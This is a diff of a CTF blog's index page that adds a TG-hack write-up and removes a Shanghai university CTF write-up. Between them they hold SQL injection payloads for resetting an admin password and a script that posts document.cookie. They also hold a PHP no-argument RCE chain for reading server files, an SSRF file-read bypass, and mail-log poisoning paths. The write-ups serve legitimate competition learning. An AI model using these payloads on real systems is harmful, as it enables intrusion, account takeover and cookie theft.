@@ -207,6 +207,143 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d6b507308d.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/header.jpg">
+      <meta itemprop="name" content="XiaoLeung">
+      <meta itemprop="description" content="随笔、分享、记录生活">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiao Leung's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/articles/d6b507308d.html" class="post-title-link" itemprop="url">TG-hack CTF Write Up</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-04-12 15:34:45" itemprop="dateCreated datePublished" datetime="2020-04-12T15:34:45+08:00">2020-04-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-10-14 17:12:31" itemprop="dateModified" datetime="2020-10-14T17:12:31+08:00">2020-10-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>1.7k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Tghack-CTF-WP"><a href="#Tghack-CTF-WP" class="headerlink" title="Tghack CTF WP"></a>Tghack CTF WP</h1><h2 id="Redux"><a href="#Redux" class="headerlink" title="Redux"></a>Redux</h2><blockquote>
+<p>Author: <a href="https://tghack.no/authors#12" target="_blank" rel="noopener"><strong>Nora - Norasaurus#8234</strong></a></p>
+<p>Here is your Gaia form to get your weekly plant rations. Complete the form and reap your reward!</p>
+<p><a href="https://redux.tghack.no/" target="_blank" rel="noopener">redux.tghack.no</a></p>
+</blockquote>
+<p>FLAG in a JavaScript File.</p>
+<h2 id="Shop"><a href="#Shop" class="headerlink" title="Shop"></a>Shop</h2><blockquote>
+<p>Author: <a href="https://tghack.no/authors#11" target="_blank" rel="noopener"><strong>Roy Olav Purser - roypur#9953</strong></a></p>
+<p>We found the Mother cult merch store. In addition to selling clothing items they sell some secrets we need. For the time being we haven’t been able to secure the funds necessary to do so. Can you help us?</p>
+<ul>
+<li><a href="https://shop.tghack.no/" target="_blank" rel="noopener">shop.tghack.no</a></li>
+</ul>
+</blockquote>
+<p>O-M-G,I regret it very much.😂My friends and I were still discussing last night  about it might have changed the price to negative. I found it could be bought when the id undefined. But I forgot to check it when price to negative.</p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20200412/15866692758656.png" alt="img"></p>
+<p>We use burp suite to packet capture and change the price to negative .It is very important to change the id to undefined.</p>
+<p>e g:</p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20200412/15866688491552.png" alt="img"></p>
+<p>And then,it happened that is amazing!We have more money!</p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20200412/15866691878335.png" alt="img"></p>
+<p>OK，we can buy the flag….</p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20200412/15866692306869.png" alt="img"></p>
+<h2 id="Bobby"><a href="#Bobby" class="headerlink" title="Bobby"></a>Bobby</h2><blockquote>
+<p> Author: <a href="https://tghack.no/authors#11" target="_blank" rel="noopener"><strong>Roy Olav Purser - roypur#9953</strong></a></p>
+<p>Little bobby forgot his password. Can you help him log in?</p>
+<p><a href="https://bobby.tghack.no/" target="_blank" rel="noopener">bobby.tghack.no</a></p>
+</blockquote>
+<p>I didn’t find any bugs in this container at 1st😭.After a long time,My classmate told me ,it has an SQL injection in the new password param when you change the pass.</p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20200412/15866718226965.png" alt="img"></p>
+<p>We can know that it’s a update sql and we can control a  param .</p>
+<p>eg:</p>
+<blockquote>
+<p>update table set column=’param’ where ……</p>
+</blockquote>
+<p>1st,I want to commented out “where“ and I write payload like the following . But it can ‘t change passwd and throw me an error…..</p>
+<pre><code>admin&#39;-- &#39; WHERE user=? AND pass=?</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20200412/15866726963625.png" alt="img"></p>
+<p>From here we should bind 2 params to this sql.So we change this payload like this:</p>
+<pre><code>admin&#39;,user=? , pass=? -- </code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20200412/15866730992987.png" alt="img"></p>
+<p>And then , we changed this admin’s pass,we can get flag, when we login.</p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20200412/15866731884985.png" alt="img"></p>
+<h2 id="Exfiltration"><a href="#Exfiltration" class="headerlink" title="Exfiltration"></a>Exfiltration</h2><blockquote>
+<p>Author: <a href="https://tghack.no/authors#11" target="_blank" rel="noopener"><strong>Roy Olav Purser - roypur#9953</strong></a></p>
+<p>We have found a forum used by members of the Mother cult. The members are sitting behind an advanced firewall without access to the internet. We need their super secret information.</p>
+<p><a href="https://exfiltration.tghack.no/" target="_blank" rel="noopener">exfiltration.tghack.no</a></p>
+</blockquote>
+<pre><code class="javascript">&lt;script&gt;
+let xhr = new XMLHttpRequest();
+xhr.open(&quot;post&quot;, window.location.href, true);
+xhr.send(document.cookie);
+&lt;/script&gt;</code></pre>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d497e0f4e8.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1951,193 +2088,6 @@ public function dlfile($file_url, $save_to)
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d51d5193e2.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/header.jpg">
-      <meta itemprop="name" content="XiaoLeung">
-      <meta itemprop="description" content="随笔、分享、记录生活">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Xiao Leung's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/articles/d51d5193e2.html" class="post-title-link" itemprop="url">上海大学生联赛部分write up</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2019-11-02 22:28:47" itemprop="dateCreated datePublished" datetime="2019-11-02T22:28:47+08:00">2019-11-02</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-10-14 17:17:18" itemprop="dateModified" datetime="2020-10-14T17:17:18+08:00">2020-10-14</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>2.3k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>2 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>​        把010编辑器放进010编辑器直接搜索就是了</p>
-<h2 id="decade"><a href="#decade" class="headerlink" title="decade"></a>decade</h2><ul>
-<li><p>页面源码提示代码在<code>/code</code>并且flag在这个页面</p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20191102/15727051288542.png" alt="img"></p>
-</li>
-<li><p>代码和字节跳动的一道boring-code相似,但是过滤得更多</p>
-<pre><code class="php"> &lt;?php
-highlight_file(__FILE__);
-$code = $_GET[&#39;code&#39;];
-if (!empty($code)) {
-        if (&#39;;&#39; === preg_replace(&#39;/[a-z]+\((?R)?\)/&#39;, NULL, $code)) {
-            if (preg_match(&#39;/readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#39;, $code)) {
-                    echo &#39;bye~&#39;;
-                } else {
-                    eval($code);
-                }
-            }
-        else {
-            echo &quot;No way!!!&quot;;
-        }
-}else {
-        echo &quot;No way!!!&quot;;
-    }
-No way!!!</code></pre>
-</li>
-<li><p>在一轮FUZZ之后我们可以得知有下面函数可用。(翻了好久，总共能过这个正则的有300多个函数吧)</p>
-<pre><code class="php">echo、implode、scandir、chr、strrev、uniqid、file、chdir、next、pos、end</code></pre>
-</li>
-<li><p>我们用字节跳动的无参数RCE知道，要读取目录那么就必须构造出<code>scandir(&#39;.&#39;)</code>,一轮无脑翻阅手册后可以知道uniqid()会生成一个唯一的临牌，但是呢，他后半部分是会变化的，那么我们将其翻转过来就能动态构造任意字符如：</p>
-<pre><code class="php">&lt;?php
-error_reporting(0);
-for($i=0;$i&lt;1000;$i++)
-echo(chr(strrev(uniqid())));
-?&gt;</code></pre>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20191102/15727060052967.png" alt="img"></p>
-</li>
-<li><p>非常明显已经可以构造在不断刷新这个网页在某一时刻就能构造出来点<code>（.）</code>进而读取到目录，而这里正则只允许26个字母构成的函数，所以var_dump这种是不可能使用了，所以这里使用<code>echo、implode</code>将返回的数组变成字符串来读取。那么构造payload如下，使用burpsuite去爆破。</p>
-<pre><code class="php">echo(implode(scandir(chr(strrev(uniqid())))));</code></pre>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20191102/15727064105621.png" alt="img"></p>
-</li>
-<li><p>可以看到已经读取了当前目录下的文件列表吗，那么下面就是要读取上层目录下的index.php文件。首先读取一下上层目录的列表，我们从上读取当前目录可以知道返回的文件目录数组如下关系：</p>
-<pre><code class="php\">[0=&gt;&#39;.&#39;,1=&gt;&#39;..&#39;,3=&gt;&#39;index.php&#39;]</code></pre>
-</li>
-<li><p>那么我们要读取上层目录就需要构造<code>scandir(&#39;..&#39;)</code>,那么很明显我们获取第二个元素即可得到两点，构造payload如下：</p>
-<pre><code class="php">  echo(implode(scandir(next(scandir(chr(strrev(uniqid())))))));</code></pre>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20191102/15727066455027.png" alt="img"></p>
-</li>
-<li><p>从这里我们可以得知index.php在最后一个元素，那么我们可以使用end()直接获取到，但是要读取到这个文件我们首先需要先跳转到这个目录，那么可以这样构造,使用chdir向上跳转一个目录：</p>
-<pre><code class="php">chdir(next(scandir(chr(strrev(uniqid())))))</code></pre>
-</li>
-<li><p>读取文件呢，我们可以使用第一个payload读取到文件目录，然后使用end()函数去读取最后一个元素，进而读取文件。</p>
-<pre><code class="php">file(end(scandir(chr(strrev(uniqid()))))</code></pre>
-</li>
-<li><p>那么综合起来payload如下：</p>
-<pre><code class="php">echo(implode(file(end(scandir(chr(strrev(uniqid(chdir(next(scandir(chr(strrev(uniqid())))))))))))));</code></pre>
-</li>
-<li><p>但是这里存在一个问题，那就是两次去的值不一定都是点，那么就需要进行N次爆破，在某一时刻这两个值都取到点的时候那么就会读取成功。                                                                                                                                                                                                                                 </p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20191103/15727713396593.jpg" alt="img">                                                                                                                                                                                                                                                                       </p>
-</li>
-</ul>
-<h2 id="WEB2"><a href="#WEB2" class="headerlink" title="WEB2"></a>WEB2</h2><ul>
-<li><p>开头非常简单的ssrf，直接使用file:///协议即可读到内容</p>
-<pre><code class="php">&lt;?php
-highlight_file(__FILE__);
-$x = $_GET[&#39;x&#39;];
-$pos = strpos($x,&quot;php&quot;);
-if($pos){
-        exit(&quot;denied&quot;);
-}
-$ch = curl_init();
-curl_setopt($ch,CURLOPT_URL,&quot;$x&quot;);
-curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
-$result = curl_exec($ch);
-echo $result; </code></pre>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20191103/1572771550497.png" alt="img"></p>
-</li>
-<li><p>这里直接读flag.php,直接使用双url编码绕过</p>
-<pre><code class="php">index.php?x=file:///var/www/html/flag.p%2568p</code></pre>
-</li>
-</ul>
-<p>  <img src="http://goodcheerleung.gitee.io/mycute/20191103/15727716421531.png" alt="img"></p>
-<ul>
-<li><p>提示/etc/hosts</p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20191103/15727719047413.png" alt="img"></p>
-</li>
-<li><p>发现内网地址，直接爆破内网，发现172.18.0.2返回提示有文件包含漏洞</p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20191103/15727719455947.png" alt="img"></p>
-</li>
-<li><p>扫描这个主机开放的端口</p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20191103/15727720229388.png" alt="img"></p>
-</li>
-<li><p>发现25端口开放，这里可以联想到结合文件包含，使用 <code>gopherus</code> 污染日志文件从而达到RCE。使用 <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Ftarunkant%2FGopherus" target="_blank" rel="noopener"> gopherus </a>生成利用脚本。污染成功后使用文件包含即可rce，日志文件路径：</p>
-<pre><code class="php">/var/log/maillog
-/var/log/mail.log
-/var/adm/maillog
-/var/adm/syslog/mail.log</code></pre>
-</li>
-</ul>
-<p>  <img src="http://goodcheerleung.gitee.io/mycute/20191103/15727724065385.png" alt="img"></p>
-<p>  <img src="http://goodcheerleung.gitee.io/mycute/20191103/15727724916990.png" alt="img"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -2209,7 +2159,7 @@ echo $result; </code></pre>
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">73</span>
+          <span class="site-state-item-count">74</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -2280,12 +2230,12 @@ echo $result; </code></pre>
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">267k</span>
+    <span title="站点总字数">281k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">4:02</span>
+    <span title="站点阅读时长">4:16</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
